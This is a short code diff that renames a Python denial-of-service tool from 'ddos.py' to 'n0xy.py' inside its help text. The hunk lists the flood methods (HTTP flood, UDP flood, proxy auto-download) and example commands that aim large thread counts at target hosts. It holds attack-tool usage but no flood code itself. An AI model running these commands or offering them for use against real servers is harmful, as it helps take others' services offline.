@@ -445,7 +445,7 @@ def main():
 ╚══════════════════════════════════════════════════════════╝
 
 USAGE:
-    python ddos.py <method> <target> <threads> <duration> [proxy_file]
+    python n0xy.py <method> <target> <threads> <duration> [proxy_file]
 
 METHODS:
     http-flood  - HTTP/HTTPS flood attack
@@ -453,10 +453,10 @@ METHODS:
     auto        - Auto-download proxies then HTTP flood
 
 EXAMPLES:
-    python ddos.py http-flood https://example.com 500 600 auto
-    python ddos.py http-flood https://target.com 1000 600 proxies.txt
-    python ddos.py udp-flood target.com 80 1000 600
-    python ddos.py auto https://target.com 500 600
+    python n0xy.py http-flood https://example.com 500 600 auto
+    python n0xy.py http-flood https://target.com 1000 600 proxies.txt
+    python n0xy.py udp-flood target.com 80 1000 600
+    python n0xy.py auto https://target.com 500 600
 
 ARGUMENTS:
     method      - Attack method
